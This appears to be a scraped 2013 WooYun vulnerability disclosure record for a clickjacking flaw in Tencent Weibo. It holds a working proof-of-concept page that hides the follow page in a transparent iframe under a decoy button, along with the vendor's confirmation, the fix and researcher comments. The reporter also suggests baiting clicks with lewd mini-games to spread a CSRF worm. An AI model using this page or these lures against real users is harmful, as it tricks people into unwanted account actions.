{"id": 13333, "wybug_id": "wooyun-2013-019683", "wybug_title": "腾讯微博clickhijacking(不要被你的双眼欺骗)", "wybug_corp": "腾讯", "wybug_author": "冷冷的夜", "wybug_date": "2013-03-07 15:33", "wybug_open_date": "2013-04-21 15:34", "wybug_type": "CSRF", "wybug_level": "低", "wybug_rank_0": "1", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["利用技巧", "蠕虫"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-03-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-03-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-03-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-04-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-04-21：\t细节向公众公开  简要描述： 腾讯微博clickjacking  详细说明：  表面上她是这样\n\n其实她是这样\n\n点击了之后就是这样了\n\n是在上次的owasp 2012上面看到的，今天试了下，结果还是可以的当然，这只是一个收听的例子，还可以进行其他的操作。能干的事情还很多，就看你的思路了。比如你完全可以开发些小游戏，如“是男人就把她脱完”，“帮美女脱衣”等的小游戏来诱惑别人“帮你”点击。假设有一个腾讯微博的csrf worm，完全可以用这种方式使得用户既玩的开心，又能帮你传播这个csrf worm。总之，思想一定要猥琐。   漏洞证明：  \n<html><head><title>腾讯微博clickjacking  </title><script>      function showHide_frame() {        var text_1 = document.getElementById(\"target\");        text_1.style.opacity = this.checked ? \"0.5\": \"0\";        text_1.style.filter = \"progid:DXImageTransform.Microsoft.Alpha(opacity=\" + (this.checked ? \"50\": \"0\") + \");\"      }</script></head><body><div style=\"position:absolute;top:20px;left:300px;\"><font color=”#AA00DD″ size=\"22\">腾讯微博 clickjacking attack </font></div><div style=\"position:absolute;color:#00ff00;top:184px;left:579px\"><div style=\"color:red\">下一页</div><img src=\"2.jpg\"></div><div><iframe id=\"target\" src=\"http://t.qq.com/lenglengdy/follower#mainWrapper\" style=\"position:absolute;width:100%;height:500px;left:200px;filter:alpha(opacity=0.0);opacity:0.0;\"></iframe></div></body><div style=\"position:absolute;top:440px;left:550px;\"><input id=\"showHide_frame\" type=\"checkbox\" onclick=\"showHide_frame.call(this);\"/><label for=\"showHide_frame\">Show the jacked I--Frame</label></div></html>\n参照：http://www.owasp.org.cn/OWASP_Conference/2012/downloading/07NeglectedUIRedressing.pdfhttp://mall.aliapp.com/clickjacking2.html    修复方案：  deny sameorigin   版权声明：转载请注明来源 冷冷的夜@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2013-03-11 11:35 厂商回复： 非常感谢您的报告。我们会马上安排专人跟进确认处理，有新的情况会及时同步 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-03-07 15:57 |    \t\tredrain有节操 \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:26        | ztz这下子有165了！>_<'/&\\)\t\t \n  视觉欺骗的例子蛮少，吊    \n     2013-03-07 16:00 |    \t\t小蝎 \t\t\t( 普通白帽子  |\t\t\t        Rank:140 漏洞数:21        )\t\t \n  标题亮瞎眼了。。。    \n     2013-03-07 17:00 |    \t\tMEng \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:2        | 刚接触这个领域、来学习了)\t\t \n  点击劫持还是CSRF?    \n     2013-03-07 22:38 |    \t\t苏南同学 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:5        | 苏南同学，就是苏南同学~~~)\t\t \n  啥叫视觉劫持啊？头一次听说    \n     2013-03-07 23:06 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  点击劫持?。。关注一下    \n     2013-03-08 12:56 |    \t\t小蝎 \t\t\t( 普通白帽子  |\t\t\t        Rank:140 漏洞数:21        )\t\t \n  就是点击劫持 和CSRF不同的是，这个漏洞更加注重与用户的交互性。比CSRF的杀伤力更厉害。    \n     2013-03-08 13:38 |    \t\tredrain有节操 \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:26        | ztz这下子有165了！>_<'/&\\)\t\t \n  @小蝎 大多就是利用iframe做一个内嵌，然后诱导用户点击    \n     2013-03-11 18:53 |    \t\t冷冷的夜 \t\t\t( 普通白帽子  |\t\t\t        Rank:135 漏洞数:12        )\t\t \n   WooYun: 腾讯单点登录系统跨域劫持漏洞 Ⅱ WooYun: 腾讯单点登录系统跨域劫持漏洞    \n     2013-04-10 23:37 |    \t\tBlackeagle \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:10        | 向WooYun致敬)\t\t \n  @苏南同学 看看《白帽子讲web安全》你就知道了    \n     2013-04-11 12:21 |    \t\t苏南同学 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:5        | 苏南同学，就是苏南同学~~~)\t\t \n  @Blackeagle 恩恩，知道了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}